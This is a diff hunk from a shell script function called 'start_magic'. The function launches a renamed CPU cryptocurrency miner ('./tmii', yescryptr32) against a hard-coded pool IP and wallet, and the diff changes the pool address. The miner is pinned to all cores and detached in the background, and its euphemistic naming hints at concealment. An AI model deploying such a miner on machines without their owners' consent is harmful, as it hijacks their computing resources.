@@ -24,7 +24,7 @@ start_magic() {
   local cores_to_use="0-$(($num_cores - 1))"  # Using the first $num_cores cores
 
   # Start the mining process with core affinity and output to log file
-  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.224.99:844 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
+  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.225.161:808 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
